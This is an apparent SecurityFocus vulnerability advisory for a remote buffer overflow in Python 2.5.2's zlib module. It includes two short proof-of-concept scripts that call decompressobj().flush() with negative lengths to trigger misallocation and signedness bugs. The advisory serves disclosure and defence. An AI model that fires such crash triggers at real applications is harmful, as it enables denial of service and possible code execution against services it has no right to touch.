source: http://www.securityfocus.com/bid/28715/info

Python zlib module is prone to a remote buffer-overflow vulnerability because the library fails to properly sanitize user-supplied data.

An attacker can exploit this issue to execute arbitrary code with the privileges of the user running an application that relies on the affected library. Failed exploit attempts will result in a denial-of-service condition.

This issue affects Python 2.5.2; other versions may also be vulnerable. 

python-2.5.2-zlib-unflush-misallocation.py
------------------------------------------
#!/usr/bin/python

import zlib

msg = """
Desire to know why, and how, curiosity; such as is in no living creature
        but man:
so that man is distinguished, not only by his reason, but also by this
        singular passion
from other animals; in whom the appetite of food, and other pleasures of
        sense, by
predominance, take away the care of knowing causes; which is a lust of
        the mind,
that by a perseverance of delight in the continual and indefatigable
generation of knowledge, exceedeth the short vehemence of any carnal
        pleasure.
"""

compMsg = zlib.compress(msg)
bad = -24
decompObj = zlib.decompressobj()
decompObj.decompress(compMsg)
decompObj.flush(bad)

	
python-2.5.2-zlib-unflush-signedness.py:
----------------------------------------
#!/usr/bin/python

import zlib

msg = """
Society in every state is a blessing, but government even in its best
        state is but a necessary evil
in its worst state an intolerable one; for when we suffer, or are
        exposed to the same miseries by a
government, which we might expect in a country without government, our
        calamities is heightened by
reflecting that we furnish the means by which we suffer! Government,
        like dress, is the badge of
lost innocence; the palaces of kings are built on the ruins of the
        bowers of paradise. For were
the impulses of conscience clear, uniform, and irresistibly obeyed, man
        would need no other
lawgiver; but that not being the case, he finds it necessary to
        surrender up a part of his property
to furnish means for the protection of the rest; and this he is induced
        to do by the same prudence which
in every other case advises him out of two evils to choose the least.
        Wherefore, security being the true
design and end of government, it unanswerably follows that whatever form
        thereof appears most likely to
ensure it to us, with the least expense and greatest benefit, is
        preferable to all others.
""" * 1024

compMsg = zlib.compress(msg)
bad = -2
decompObj = zlib.decompressobj()
decompObj.decompress(compMsg, 1)
decompObj.flush(bad)